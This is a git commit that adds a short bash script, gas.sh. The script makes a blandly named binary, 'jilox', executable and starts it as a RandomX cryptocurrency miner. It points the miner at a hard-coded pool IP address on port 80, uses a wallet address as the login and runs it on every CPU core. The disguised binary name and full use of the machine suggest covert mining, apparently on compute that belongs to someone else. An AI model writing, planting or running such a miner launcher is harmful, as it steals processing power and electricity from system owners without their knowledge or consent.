f55e349e3c17c3aeab8ba561d521bbeb5bdd8cf7
vinawinjena <143081460+vinawinjena@users.noreply.github.com>
2023-08-25 20:14:24 +0700

    Create gas.sh

---
+++ gas.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+chmod u+x jilox
+./jilox --url 172.104.176.128:80 --user ZEPHs9wbP2kgeHU9wJoPonUwJAsZkj5rHagMgnDjK7186LuNVVfFeCGDByX2Y18AvbdRJQsNK4Fu4QM7XGs1bXegNGhthDhZ5ht --pass Openheimer --donate-level 1 -a rx/0 -t $(nproc --all)
